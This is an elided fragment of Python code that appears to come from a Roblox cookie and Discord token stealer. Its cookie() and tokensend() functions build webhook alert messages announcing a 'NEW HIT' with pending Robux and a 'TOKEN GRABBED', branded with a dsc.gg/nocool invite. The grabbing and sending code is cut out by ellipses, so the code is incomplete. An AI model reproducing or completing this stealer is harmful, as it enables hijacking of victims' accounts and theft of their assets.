...
def cookie():
    ...
    "embeds": [
      {
        "title": f":rocket:  - NEW HIT , dsc.gg/nocool X {madeby}",
        "color": 15654879,
        "fields": [
          {
            "name": "Robux (pending)",
    ...
    "username": f"{name} - dsc.gg/nocool X {madeby}",
    "attachments": []
    }
...
def tokensend():
  ...
  "embeds": [
    {
      "title": f":rocket:  - TOKEN GRABBED , dsc.gg/nocool X {madeby}",
      "color": 15654879,
      "fields": [
        {
